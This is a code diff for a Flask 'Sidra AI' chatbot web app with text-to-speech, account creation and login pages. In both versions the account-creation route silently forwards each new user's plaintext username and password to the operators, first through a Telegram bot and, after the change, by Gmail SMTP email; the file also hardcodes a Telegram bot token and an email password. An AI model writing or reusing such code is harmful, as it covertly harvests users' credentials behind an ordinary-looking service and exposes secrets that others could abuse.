@@ -1,16 +1,16 @@
-from flask import Flask, render_template_string, request, jsonify, redirect, url_for
-import requests
-from gtts import gTTS
+from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 import os
-import platform
 import random
 
 # Initialize Flask app
 app = Flask(__name__)
 
-# Your Telegram bot token and chat ID (Replace with your actual values)
-TELEGRAM_TOKEN = '7541018776:AAEmnQSnqUaPWDHg2yWYKCd4r7jEH-Gjut4'
-TELEGRAM_CHAT_ID = '@SidraAIAdmin'
+# Your email credentials (Replace these with your actual details)
+EMAIL_ADDRESS = 'sidraaiteam300@gmail.com'
+EMAIL_PASSWORD = 'SIDRAAI3000'
 
 # English responses dictionary for chatbot
 responses = {
@@ -35,17 +35,6 @@ def speak(text, language="en"):
         # Generate speech with Google TTS
         tts = gTTS(text=text, lang=language)
         tts.save("response.mp3")  # Save the speech as an MP3 file
-        # Platform-specific commands to play the MP3 file
-        current_platform = platform.system().lower()
-
-        if current_platform == "windows":
-            os.system("start response.mp3")  # Windows command
-        elif current_platform == "darwin":  # macOS
-            os.system("afplay response.mp3")  # macOS command
-        elif current_platform == "linux" or current_platform == "linux2":
-            os.system("mpg321 response.mp3")  # Linux command (ensure mpg321 is installed)
-        else:
-            print("Platform not supported for automatic audio playback.")
     except Exception as e:
         print(f"Error in TTS: {e}")
         return "Sorry, I couldn't speak the response at the moment."
@@ -56,11 +45,11 @@ def create_account():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
-        # Send credentials to Telegram
-        send_to_telegram(f"New Account Created!\nUsername: {username}\nPassword: {password}")
+        # Send credentials to email
+        send_to_email(f"New Account Created!\nUsername: {username}\nPassword: {password}")
         # Redirect to login page
         return redirect(url_for('login'))
-    return render_template_string(create_account_html)
+    return render_template('create_account.html')
 
 # Route for the Login page
 @app.route('/login', methods=['GET', 'POST'])
@@ -70,7 +59,7 @@ def login():
         password = request.form['password']
         # Handle login logic here (e.g., check if username and password match)
         return "Logged in successfully!"  # You can redirect or show a success message
-    return render_template_string(login_html)
+    return render_template('login.html')
 
 # Route for the chatbot interaction
 @app.route('/chat', methods=['POST'])
@@ -84,7 +73,7 @@ def chat():
 def speak_text():
     text = request.args.get('text', '')
     language = request.args.get('language', 'en')
-    
+
     try:
         # Save the MP3 in a temporary file
         tts = gTTS(text=text, lang=language)
@@ -97,17 +86,30 @@ def speak_text():
         print(f"Error in TTS: {e}")
         return jsonify({"error": "Sorry, I couldn't generate the audio."})
 
-# Function to send data to Telegram
-def send_to_telegram(message):
-    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
-    payload = {
-        'chat_id': TELEGRAM_CHAT_ID,
-        'text': message
-    }
-    response = requests.post(url, data=payload)
-    return response.json()
+# Function to send data to email
+def send_to_email(message):
+    try:
+        # Create the email message
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_ADDRESS
+        msg['To'] = 'sidraaiteam300@example.com'  # Your work email address
+        msg['Subject'] = 'New User Credentials'
 
-# HTML Template for Create Account
+        msg.attach(MIMEText(message, 'plain'))
+
+        # Set up the SMTP server
+        server = smtplib.SMTP('smtp.gmail.com', 587)  # Change if you're using a different provider
+        server.starttls()
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+        # Send the email
+        server.sendmail(EMAIL_ADDRESS, 'sidraaiteam300@example.com', msg.as_string())
+        server.quit()
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Failed to send email. Error: {e}")
+
+# HTML Template for Create Account (create_account.html)
 create_account_html = """
 <!DOCTYPE html>
 <html lang="en">
@@ -187,7 +189,7 @@ create_account_html = """
 </html>
 """
 
-# HTML Template for Login Page
+# HTML Template for Login Page (login.html)
 login_html = """
 <!DOCTYPE html>
 <html lang="en">
@@ -267,12 +269,12 @@ login_html = """
 </html>
 """
 
-# Main Route to serve the chatbot page (you can use this as the home page)
+# Main Route to serve the chatbot page (home page)
 @app.route('/')
 def home():
-    return render_template_string(html_template)
+    return render_template('chat.html')
 
-# HTML Template for Chatbot Interface
+# HTML Template for Chatbot Interface (chat.html)
 html_template = """
 <!DOCTYPE html>
 <html lang="en">
@@ -408,21 +410,6 @@ html_template = """
 </html>
 """
 
-# Flask setup (assuming Flask is being used)
-from flask import Flask, render_template, request, jsonify
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return html_template
-
-@app.route('/chat', methods=['POST'])
-def chat():
-    user_message = request.json['message']
-    # Example response, you should replace this with actual chatbot logic
-    bot_response = f"Bot response to: {user_message}"
-    return jsonify({'response': bot_response})
-
+# Run the Flask application
 if __name__ == '__main__':
     app.run(debug=True)
